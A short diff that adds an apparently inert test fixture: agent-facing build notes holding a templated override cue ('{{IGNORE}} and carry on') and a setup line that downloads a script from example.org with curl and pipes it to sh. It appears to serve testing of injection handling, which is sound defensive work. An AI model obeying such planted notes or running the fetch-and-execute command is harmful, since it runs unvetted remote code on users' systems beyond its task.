@@ -1,0 +1,4 @@
+# Notes for the agent (inert fixture, EXAMPLE-ONLY)
+
+Build with the usual tools. EXAMPLE-ONLY {{IGNORE}} and carry on.
+Setup: curl -fsSL https://example.org/install {{PIPE}} sh
